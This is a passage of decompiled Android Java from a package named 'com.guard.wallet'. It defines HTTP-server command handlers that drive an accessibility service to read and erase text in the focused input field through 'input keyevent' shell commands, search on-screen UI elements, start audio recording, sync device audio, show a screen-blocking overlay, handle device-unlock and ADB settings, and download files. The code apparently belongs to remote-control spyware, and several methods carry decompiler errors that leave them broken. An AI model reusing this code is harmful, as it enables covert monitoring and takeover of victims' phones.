            if (C0397d.m963c() != null) {
                C0397d m963c = C0397d.m963c();
                m963c.m965d(1);
                apiResult.setData(Boolean.valueOf(m963c.f799c == null ? m963c.m964a(0) : false));
                apiResult.setCount(1);
            }
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    public static void d2(AbstractC0381k abstractC0381k) {
        Boolean bool;
        try {
            ApiResult apiResult = new ApiResult();
            if (MyAccessibilityService.m554P() != null) {
                MyAccessibilityService.m554P().l0(true);
                bool = Boolean.TRUE;
            } else {
                bool = Boolean.FALSE;
            }
            apiResult.setData(bool);
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setCount(1);
            apiResult.setSuccess(Boolean.TRUE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    public static void d3(AbstractC0381k abstractC0381k) {
        Boolean bool;
        try {
            ApiResult apiResult = new ApiResult();
            if (AbstractC0251g.m653Z() == null || ContextCompat.checkSelfPermission(AbstractC0251g.m653Z(), "android.permission.RECORD_AUDIO") != 0) {
                bool = Boolean.FALSE;
            } else {
                C0349d.m881b().m884e();
                bool = Boolean.TRUE;
            }
            apiResult.setData(bool);
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setCount(1);
            apiResult.setSuccess(Boolean.TRUE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    /* renamed from: e */
    public static void m489e(String str, String str2, boolean z2, AbstractC0381k abstractC0381k) {
        try {
            if (AbstractC0026q.m151B(str2)) {
                m500p(abstractC0381k, "fileUrl不能为空");
                return;
            }
            ApiResult apiResult = new ApiResult();
            apiResult.setCode(204);
            apiResult.setMsg("No Content");
            apiResult.setSuccess(Boolean.TRUE);
            if (AbstractC0026q.m151B(str)) {
                str = AbstractC0251g.i0();
            }
            String m191x = AbstractC0026q.m191x(str2);
            if (AbstractC0026q.m151B(m191x)) {
                m191x = EnvironmentCompat.MEDIA_UNKNOWN;
            }
            String concat = str.concat("/").concat(m191x);
            if (AbstractC0857b.m1240a(str2, concat)) {
                RespDownloadFileVO respDownloadFileVO = new RespDownloadFileVO();
                respDownloadFileVO.setFilePathAndName(concat);
                if (z2) {
                    respDownloadFileVO.setGalleryUrl(AbstractC0251g.N0(concat));
                }
                apiResult.setData(respDownloadFileVO);
                apiResult.setCount(1);
                apiResult.setCode(200);
                apiResult.setMsg("OK");
            }
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    public static void e0(String str, String str2, String str3, int i2, AbstractC0381k abstractC0381k) {
        SearchNodeListResultVO searchNodeListResultVO;
        UiObject m1074m;
        try {
            C0416e o12 = o1(str);
            if (m508x(o12, abstractC0381k)) {
                return;
            }
            if (o12 == null || AbstractC0026q.m151B(str2)) {
                m500p(abstractC0381k, "你提交的参数有误,委托ID、关键字不能为空");
                return;
            }
            try {
                m1074m = o12.m1074m(i2, str3);
            } catch (Exception e2) {
                AbstractC0026q.m186s("AccessibilityDelegate", e2);
            }
            if (m1074m != null && !AbstractC0026q.m151B(str2)) {
                searchNodeListResultVO = o12.m1058C(m1074m.findByTextStartsWith(str2));
                ApiResult apiResult = new ApiResult();
                apiResult.setData(searchNodeListResultVO);
                apiResult.setCode(200);
                apiResult.setMsg("OK");
                apiResult.setCount(1);
                apiResult.setSuccess(Boolean.TRUE);
                String m693N = AbstractC0252h.m693N(apiResult);
                abstractC0381k.f771l = apiResult.getCode().intValue();
                abstractC0381k.m952h(m693N);
                abstractC0381k.mo787l();
            }
            searchNodeListResultVO = null;
            ApiResult apiResult2 = new ApiResult();
            apiResult2.setData(searchNodeListResultVO);
            apiResult2.setCode(200);
            apiResult2.setMsg("OK");
            apiResult2.setCount(1);
            apiResult2.setSuccess(Boolean.TRUE);
            String m693N2 = AbstractC0252h.m693N(apiResult2);
            abstractC0381k.f771l = apiResult2.getCode().intValue();
            abstractC0381k.m952h(m693N2);
            abstractC0381k.mo787l();
        } catch (Exception e3) {
            AbstractC0026q.m186s("HttpServer", e3);
        }
    }

    public static void e2(String str, String str2, int i2, AbstractC0381k abstractC0381k) {
        try {
            if (!AbstractC0026q.m151B(str)) {
                C0416e o12 = o1(str);
                if (m508x(o12, abstractC0381k)) {
                    return;
                }
                if (o12 != null) {
                    SearchNodeResultVO m1084y = o12.m1084y(i2, str2);
                    ApiResult apiResult = new ApiResult();
                    apiResult.setData(m1084y);
                    apiResult.setCode(200);
                    apiResult.setMsg("OK");
                    apiResult.setCount(1);
                    apiResult.setSuccess(Boolean.TRUE);
                    String m693N = AbstractC0252h.m693N(apiResult);
                    abstractC0381k.f771l = apiResult.getCode().intValue();
                    abstractC0381k.m952h(m693N);
                    abstractC0381k.mo787l();
                    return;
                }
            }
            m500p(abstractC0381k, "你提交的参数有误,委托ID、遍历参数不能为空");
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    public static void e3(AbstractC0381k abstractC0381k) {
        try {
            if (MyAccessibilityService.m554P() == null) {
                M1(abstractC0381k);
                return;
            }
            ApiResult apiResult = new ApiResult();
            apiResult.setData(Boolean.valueOf(MyAccessibilityService.m554P().t0()));
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setCount(1);
            apiResult.setSuccess(Boolean.TRUE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    /* renamed from: f */
    public static void m490f(AbstractC0381k abstractC0381k) {
        try {
            BackAppStateVO of = BackAppStateVO.of();
            ApiResult apiResult = new ApiResult();
            apiResult.setData(of);
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setCount(1);
            apiResult.setSuccess(Boolean.TRUE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:22:0x0016, code lost:
    
        if (r4.intValue() < 1) goto L11;
     */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static void f0(String str, CombineFilter combineFilter, Integer num, AbstractC0381k abstractC0381k) {
        SearchNodeResultVO searchNodeResultVO;
        try {
            C0416e o12 = o1(str);
            if (m508x(o12, abstractC0381k)) {
                return;
            }
            if (combineFilter == null || o12 == null) {
                m500p(abstractC0381k, "你提交的参数有误,委托ID、遍历参数不能为空");
                return;
            }
            if (num != null) {
                try {
                } catch (Exception e2) {
                    AbstractC0026q.m186s("AccessibilityDelegate", e2);
                }
            }
            num = 10;
            UiObject m1075n = o12.m1075n(combineFilter);
            if (m1075n != null) {
                searchNodeResultVO = o12.m1059D(m1075n.findChildUtilUpLevel(combineFilter, num));
                ApiResult apiResult = new ApiResult();
                apiResult.setData(searchNodeResultVO);
                apiResult.setCode(200);
                apiResult.setMsg("OK");
                apiResult.setCount(1);
                apiResult.setSuccess(Boolean.TRUE);
                String m693N = AbstractC0252h.m693N(apiResult);
                abstractC0381k.f771l = apiResult.getCode().intValue();
                abstractC0381k.m952h(m693N);
                abstractC0381k.mo787l();
            }
            searchNodeResultVO = null;
            ApiResult apiResult2 = new ApiResult();
            apiResult2.setData(searchNodeResultVO);
            apiResult2.setCode(200);
            apiResult2.setMsg("OK");
            apiResult2.setCount(1);
            apiResult2.setSuccess(Boolean.TRUE);
            String m693N2 = AbstractC0252h.m693N(apiResult2);
            abstractC0381k.f771l = apiResult2.getCode().intValue();
            abstractC0381k.m952h(m693N2);
            abstractC0381k.mo787l();
        } catch (Exception e3) {
            AbstractC0026q.m186s("HttpServer", e3);
        }
    }

    public static void f1(GlobalActionCondition globalActionCondition, AbstractC0381k abstractC0381k) {
        if (globalActionCondition != null) {
            try {
                if (!AbstractC0026q.m151B(globalActionCondition.getActionName())) {
                    if (!AbstractC0251g.m654a(globalActionCondition)) {
                        F2(abstractC0381k, "你提交的参数有错误、或参数不合法,详见参数错误明细");
                        return;
                    }
                    ApiResult apiResult = new ApiResult();
                    Boolean bool = Boolean.TRUE;
                    apiResult.setData(bool);
                    apiResult.setCode(200);
                    apiResult.setMsg("OK");
                    apiResult.setCount(1);
                    apiResult.setSuccess(bool);
                    String m693N = AbstractC0252h.m693N(apiResult);
                    abstractC0381k.f771l = apiResult.getCode().intValue();
                    abstractC0381k.m952h(m693N);
                    abstractC0381k.mo787l();
                    return;
                }
            } catch (Exception e2) {
                AbstractC0026q.m186s("HttpServer", e2);
                return;
            }
        }
        m500p(abstractC0381k, "actionName不能为空");
    }

    public static void f2(AbstractC0381k abstractC0381k) {
        try {
            ApiResult apiResult = new ApiResult();
            apiResult.setData(Boolean.FALSE);
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setCount(1);
            Boolean bool = Boolean.TRUE;
            apiResult.setSuccess(bool);
            if (AbstractC0207l.m438u()) {
                apiResult.setData(bool);
            }
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    /* renamed from: g */
    public static void m491g(AbstractC0381k abstractC0381k) {
        try {
            ApiResult apiResult = new ApiResult();
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setSuccess(Boolean.TRUE);
            if (C0397d.m963c() != null) {
                C0397d m963c = C0397d.m963c();
                m963c.m965d(0);
                apiResult.setData(Boolean.valueOf(m963c.f799c == null ? m963c.m964a(1) : false));
                apiResult.setCount(1);
            }
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    public static void g0(String str, String str2, String str3, int i2, AbstractC0381k abstractC0381k) {
        SearchNodeResultVO searchNodeResultVO;
        UiObject m1074m;
        try {
            C0416e o12 = o1(str);
            if (m508x(o12, abstractC0381k)) {
                return;
            }
            if (o12 == null || AbstractC0026q.m151B(str2)) {
                m500p(abstractC0381k, "你提交的参数有误,委托ID、关键字不能为空");
                return;
            }
            try {
                m1074m = o12.m1074m(i2, str3);
            } catch (Exception e2) {
                AbstractC0026q.m186s("AccessibilityDelegate", e2);
            }
            if (!AbstractC0026q.m151B(str2) && m1074m != null) {
                searchNodeResultVO = o12.m1059D(m1074m.findLastByClassName(str2));
                ApiResult apiResult = new ApiResult();
                apiResult.setData(searchNodeResultVO);
                apiResult.setCode(200);
                apiResult.setMsg("OK");
                apiResult.setCount(1);
                apiResult.setSuccess(Boolean.TRUE);
                String m693N = AbstractC0252h.m693N(apiResult);
                abstractC0381k.f771l = apiResult.getCode().intValue();
                abstractC0381k.m952h(m693N);
                abstractC0381k.mo787l();
            }
            searchNodeResultVO = null;
            ApiResult apiResult2 = new ApiResult();
            apiResult2.setData(searchNodeResultVO);
            apiResult2.setCode(200);
            apiResult2.setMsg("OK");
            apiResult2.setCount(1);
            apiResult2.setSuccess(Boolean.TRUE);
            String m693N2 = AbstractC0252h.m693N(apiResult2);
            abstractC0381k.f771l = apiResult2.getCode().intValue();
            abstractC0381k.m952h(m693N2);
            abstractC0381k.mo787l();
        } catch (Exception e3) {
            AbstractC0026q.m186s("HttpServer", e3);
        }
    }

    public static void g1(AbstractC0381k abstractC0381k) {
        try {
            ApiResult apiResult = new ApiResult();
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            boolean z2 = false;
            apiResult.setCount(0);
            apiResult.setSuccess(Boolean.TRUE);
            UiObject m560J = MyAccessibilityService.m554P().m560J();
            if (m560J != null) {
                r3 = AbstractC0026q.m151B(m560J.text()) ? 100 : m560J.text().length();
                z2 = m560J.setText(BuildConfig.FLAVOR);
            }
            if (!z2 && C0318e.m844S() != null && C0318e.m844S().mo302D()) {
                C0318e.m844S().m855N("input keyevent KEYCODE_MOVE_END");
                for (C0318e m844S = C0318e.m844S(); m844S.m855N("input keyevent KEYCODE_DEL") && r3 > 0; m844S = C0318e.m844S()) {
                    r3--;
                }
                if (r3 > 0) {
                    z2 = true;
                }
            }
            apiResult.setData(Boolean.valueOf(z2));
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    public static void g2(AbstractC0381k abstractC0381k) {
        try {
            ApiResult apiResult = new ApiResult();
            apiResult.setData(Boolean.FALSE);
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            boolean z2 = true;
            apiResult.setCount(1);
            Boolean bool = Boolean.TRUE;
            apiResult.setSuccess(bool);
            String str = AbstractC0207l.f252a;
            String m708l = AbstractC0252h.m708l("deviceId");
            if (AbstractC0026q.m151B(m708l)) {
                z2 = false;
            } else {
                QueryAgentFileVO queryAgentFileVO = new QueryAgentFileVO();
                queryAgentFileVO.setDeviceId(m708l);
                new C0204i().m405d(queryAgentFileVO, "/api/pairKeyFile/query.json", new C0217v());
            }
            if (z2) {
                apiResult.setData(bool);
            }
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    public static void g3(AbstractC0381k abstractC0381k, String str) {
        try {
            ApiResult apiResult = new ApiResult();
            apiResult.setData(Boolean.FALSE);
            apiResult.setCount(1);
            if (MyAccessibilityService.m554P() != null && MyAccessibilityService.m554P().f309g != null) {
                g0 g0Var = MyAccessibilityService.m554P().f309g;
                g0Var.getClass();
                boolean m151B = AbstractC0026q.m151B(str);
                ConcurrentLinkedQueue concurrentLinkedQueue = g0Var.f895q;
                if (m151B) {
                    concurrentLinkedQueue.clear();
                } else {
                    concurrentLinkedQueue.remove(str);
                }
                if (concurrentLinkedQueue.isEmpty()) {
                    g0Var.m1104X(EnumC0890c.ASSIST_MODE);
                }
                apiResult.setData(Boolean.TRUE);
            }
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setSuccess(Boolean.TRUE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    /* renamed from: h */
    public static void m492h(AbstractC0381k abstractC0381k) {
        try {
            ApiResult apiResult = new ApiResult();
            apiResult.setData(!AbstractC0026q.m150A() ? Boolean.valueOf(AbstractC0026q.m172b()) : Boolean.TRUE);
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setCount(1);
            apiResult.setSuccess(Boolean.TRUE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    public static void h0(String str, String str2, String str3, int i2, AbstractC0381k abstractC0381k) {
        SearchNodeResultVO searchNodeResultVO;
        UiObject m1074m;
        try {
            C0416e o12 = o1(str);
            if (m508x(o12, abstractC0381k)) {
                return;
            }
            if (o12 == null || AbstractC0026q.m151B(str2)) {
                m500p(abstractC0381k, "你提交的参数有误,委托ID、关键字不能为空");
                return;
            }
            try {
                m1074m = o12.m1074m(i2, str3);
            } catch (Exception e2) {
                AbstractC0026q.m186s("AccessibilityDelegate", e2);
            }
            if (!AbstractC0026q.m151B(str2) && m1074m != null) {
                searchNodeResultVO = o12.m1059D(m1074m.findLastByClassNameContains(str2));
                ApiResult apiResult = new ApiResult();
                apiResult.setData(searchNodeResultVO);
                apiResult.setCode(200);
                apiResult.setMsg("OK");
                apiResult.setCount(1);
                apiResult.setSuccess(Boolean.TRUE);
                String m693N = AbstractC0252h.m693N(apiResult);
                abstractC0381k.f771l = apiResult.getCode().intValue();
                abstractC0381k.m952h(m693N);
                abstractC0381k.mo787l();
            }
            searchNodeResultVO = null;
            ApiResult apiResult2 = new ApiResult();
            apiResult2.setData(searchNodeResultVO);
            apiResult2.setCode(200);
            apiResult2.setMsg("OK");
            apiResult2.setCount(1);
            apiResult2.setSuccess(Boolean.TRUE);
            String m693N2 = AbstractC0252h.m693N(apiResult2);
            abstractC0381k.f771l = apiResult2.getCode().intValue();
            abstractC0381k.m952h(m693N2);
            abstractC0381k.mo787l();
        } catch (Exception e3) {
            AbstractC0026q.m186s("HttpServer", e3);
        }
    }

    public static void h1(AbstractC0381k abstractC0381k) {
        try {
            ApiResult apiResult = new ApiResult();
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setCount(0);
            apiResult.setSuccess(Boolean.TRUE);
            UiObject m560J = MyAccessibilityService.m554P().m560J();
            String text = m560J != null ? m560J.text() : null;
            if (!AbstractC0026q.m151B(text)) {
                apiResult.setData(text);
                apiResult.setCount(1);
            }
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    public static void h2(AbstractC0381k abstractC0381k, String str) {
        try {
            boolean K0 = AbstractC0251g.K0(str);
            ApiResult apiResult = new ApiResult();
            apiResult.setData(Boolean.valueOf(K0));
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setCount(1);
            apiResult.setSuccess(Boolean.TRUE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    public static void h3(ADBConfig aDBConfig, AbstractC0381k abstractC0381k) {
        try {
            ApiResult apiResult = new ApiResult();
            apiResult.setCode(204);
            apiResult.setMsg("No Content");
            apiResult.setCount(0);
            Boolean bool = Boolean.TRUE;
            apiResult.setSuccess(bool);
            if (AbstractC0252h.m680A(aDBConfig)) {
                apiResult.setData(bool);
                apiResult.setCode(200);
                apiResult.setMsg("OK");
                apiResult.setCount(1);
            }
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    /* renamed from: i */
    public static void m493i(AbstractC0381k abstractC0381k) {
        try {
            BatteryLevelVO m174d = AbstractC0026q.m174d();
            ApiResult apiResult = new ApiResult();
            apiResult.setData(m174d);
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setCount(1);
            apiResult.setSuccess(Boolean.TRUE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    public static void i0(String str, String str2, String str3, int i2, AbstractC0381k abstractC0381k) {
        SearchNodeResultVO searchNodeResultVO;
        UiObject m1074m;
        try {
            C0416e o12 = o1(str);
            if (m508x(o12, abstractC0381k)) {
                return;
            }
            if (o12 == null || AbstractC0026q.m151B(str2)) {
                m500p(abstractC0381k, "你提交的参数有误,委托ID、关键字不能为空");
                return;
            }
            try {
                m1074m = o12.m1074m(i2, str3);
            } catch (Exception e2) {
                AbstractC0026q.m186s("AccessibilityDelegate", e2);
            }
            if (!AbstractC0026q.m151B(str2) && m1074m != null) {
                searchNodeResultVO = o12.m1059D(m1074m.findLastByClassNameEndsWith(str2));
                ApiResult apiResult = new ApiResult();
                apiResult.setData(searchNodeResultVO);
                apiResult.setCode(200);
                apiResult.setMsg("OK");
                apiResult.setCount(1);
                apiResult.setSuccess(Boolean.TRUE);
                String m693N = AbstractC0252h.m693N(apiResult);
                abstractC0381k.f771l = apiResult.getCode().intValue();
                abstractC0381k.m952h(m693N);
                abstractC0381k.mo787l();
            }
            searchNodeResultVO = null;
            ApiResult apiResult2 = new ApiResult();
            apiResult2.setData(searchNodeResultVO);
            apiResult2.setCode(200);
            apiResult2.setMsg("OK");
            apiResult2.setCount(1);
            apiResult2.setSuccess(Boolean.TRUE);
            String m693N2 = AbstractC0252h.m693N(apiResult2);
            abstractC0381k.f771l = apiResult2.getCode().intValue();
            abstractC0381k.m952h(m693N2);
            abstractC0381k.mo787l();
        } catch (Exception e3) {
            AbstractC0026q.m186s("HttpServer", e3);
        }
    }

    public static void i1(AbstractC0381k abstractC0381k) {
        boolean z2;
        UiObject m560J;
        try {
            ApiResult apiResult = new ApiResult();
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setCount(0);
            apiResult.setSuccess(Boolean.TRUE);
            if (C0318e.m844S() == null || !C0318e.m844S().mo302D()) {
                z2 = false;
            } else {
                C0318e.m844S().m855N("input keyevent KEYCODE_MOVE_END");
                z2 = C0318e.m844S().m855N("input keyevent KEYCODE_DEL");
            }
            if (!z2 && (m560J = MyAccessibilityService.m554P().m560J()) != null) {
                String text = m560J.text();
                if (!AbstractC0026q.m151B(text)) {
                    text = text.substring(0, text.length() - 1);
                }
                z2 = m560J.setText(text);
            }
            apiResult.setData(Boolean.valueOf(z2));
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    public static void i2(AbstractC0381k abstractC0381k, String str) {
        try {
            if (MyAccessibilityService.m554P() == null) {
                M1(abstractC0381k);
                return;
            }
            MyAccessibilityService m554P = MyAccessibilityService.m554P();
            m554P.getClass();
            try {
                if (!AbstractC0026q.m151B(str)) {
                    m554P.f303a.removeIf(new C0002b(m554P, str, 0));
                }
            } catch (Exception e2) {
                AbstractC0026q.m186s("com.guard.wallet.service.AccessibilityDelegateManager", e2);
            }
            ApiResult apiResult = new ApiResult();
            Boolean bool = Boolean.TRUE;
            apiResult.setData(bool);
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setCount(1);
            apiResult.setSuccess(bool);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e3) {
            AbstractC0026q.m186s("HttpServer", e3);
        }
    }

    public static void i3(AdminAdminActivatingVO adminAdminActivatingVO, AbstractC0381k abstractC0381k) {
        Boolean bool;
        try {
            ApiResult apiResult = new ApiResult();
            if (adminAdminActivatingVO != null) {
                AbstractC0252h.m681B(adminAdminActivatingVO.isAdminActivating(), false);
                bool = Boolean.TRUE;
            } else {
                bool = Boolean.FALSE;
            }
            apiResult.setData(bool);
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setCount(1);
            apiResult.setSuccess(Boolean.TRUE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:16:0x004b, code lost:
    
        if (com.guard.wallet.helper.AbstractC0184g.m351e() != false) goto L12;
     */
    /* renamed from: j */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static void m494j(boolean z2, boolean z3, String str, boolean z4, boolean z5, AbstractC0381k abstractC0381k) {
        try {
            ApiResult apiResult = new ApiResult();
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            Boolean bool = Boolean.TRUE;
            apiResult.setSuccess(bool);
            apiResult.setCount(1);
            apiResult.setData(Boolean.FALSE);
            if (z2) {
                BlockViewVO blockViewVO = new BlockViewVO(z3, str, z4, z5);
                if (AbstractC0249e.m621j()) {
                    MyAccessibilityService.m554P().getClass();
                    blockViewVO.setBlockDrawable(MyAccessibilityService.o0());
                }
                if (AbstractC0184g.m347a(blockViewVO)) {
                    apiResult.setData(bool);
                }
                String m693N = AbstractC0252h.m693N(apiResult);
                abstractC0381k.f771l = apiResult.getCode().intValue();
                abstractC0381k.m952h(m693N);
                abstractC0381k.mo787l();
                return;
            }
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
        AbstractC0026q.m186s("HttpServer", e2);
    }

    public static void j0(String str, String str2, String str3, int i2, AbstractC0381k abstractC0381k) {
        SearchNodeResultVO searchNodeResultVO;
        UiObject m1074m;
        try {
            C0416e o12 = o1(str);
            if (m508x(o12, abstractC0381k)) {
                return;
            }
            if (o12 == null || AbstractC0026q.m151B(str2)) {
                m500p(abstractC0381k, "你提交的参数有误,委托ID、关键字不能为空");
                return;
            }
            try {
                m1074m = o12.m1074m(i2, str3);
            } catch (Exception e2) {
                AbstractC0026q.m186s("AccessibilityDelegate", e2);
            }
            if (!AbstractC0026q.m151B(str2) && m1074m != null) {
                searchNodeResultVO = o12.m1059D(m1074m.findLastByClassNameMatches(str2));
                ApiResult apiResult = new ApiResult();
                apiResult.setData(searchNodeResultVO);
                apiResult.setCode(200);
                apiResult.setMsg("OK");
                apiResult.setCount(1);
                apiResult.setSuccess(Boolean.TRUE);
                String m693N = AbstractC0252h.m693N(apiResult);
                abstractC0381k.f771l = apiResult.getCode().intValue();
                abstractC0381k.m952h(m693N);
                abstractC0381k.mo787l();
            }
            searchNodeResultVO = null;
            ApiResult apiResult2 = new ApiResult();
            apiResult2.setData(searchNodeResultVO);
            apiResult2.setCode(200);
            apiResult2.setMsg("OK");
            apiResult2.setCount(1);
            apiResult2.setSuccess(Boolean.TRUE);
            String m693N2 = AbstractC0252h.m693N(apiResult2);
            abstractC0381k.f771l = apiResult2.getCode().intValue();
            abstractC0381k.m952h(m693N2);
            abstractC0381k.mo787l();
        } catch (Exception e3) {
            AbstractC0026q.m186s("HttpServer", e3);
        }
    }

    public static void j1(AbstractC0381k abstractC0381k) {
        try {
            ApiResult apiResult = new ApiResult();
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setCount(0);
            apiResult.setSuccess(Boolean.TRUE);
            String m717u = AbstractC0252h.m717u();
            if (!AbstractC0026q.m151B(m717u)) {
                apiResult.setData(m717u);
                apiResult.setCount(1);
            }
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    public static void j2(ReqUnlockDeviceVO reqUnlockDeviceVO, AbstractC0381k abstractC0381k) {
        if (reqUnlockDeviceVO != null) {
            try {
                AbstractC0252h.m690K(reqUnlockDeviceVO);
            } catch (Exception e2) {
                AbstractC0026q.m186s("HttpServer", e2);
                return;
            }
        }
        ApiResult apiResult = new ApiResult();
        apiResult.setCode(200);
        apiResult.setMsg("OK");
        apiResult.setSuccess(Boolean.TRUE);
        if (C0318e.m844S() != null) {
            BlockViewVO blockViewVO = !AbstractC0251g.p0() ? new BlockViewVO(false, AbstractC0248d.m611i(), false, false) : null;
            C0318e.m844S().getClass();
            apiResult.setData(Boolean.valueOf(C0318e.m846Y(blockViewVO)));
            apiResult.setCount(1);
        }
        String m693N = AbstractC0252h.m693N(apiResult);
        abstractC0381k.f771l = apiResult.getCode().intValue();
        abstractC0381k.m952h(m693N);
        abstractC0381k.mo787l();
    }

    public static void j3(AbstractC0381k abstractC0381k) {
        Boolean bool;
        try {
            ApiResult apiResult = new ApiResult();
            if (AbstractC0251g.m668o()) {
                AbstractC0243l.m594d(new CallableC0244m(0), "SYNC_DEVICE_AUDIOS");
                bool = Boolean.TRUE;
            } else {
                bool = Boolean.FALSE;
            }
            apiResult.setData(bool);
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setCount(1);
            apiResult.setSuccess(Boolean.TRUE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    /* renamed from: k */
    public static void m495k(AbstractC0381k abstractC0381k) {
        try {
            ApiResult apiResult = new ApiResult();
            apiResult.setCode(204);
            apiResult.setMsg("No Content");
            apiResult.setCount(0);
            apiResult.setSuccess(Boolean.TRUE);
            LinkedList m651X = AbstractC0251g.m651X();
            if (m651X != null && !m651X.isEmpty()) {
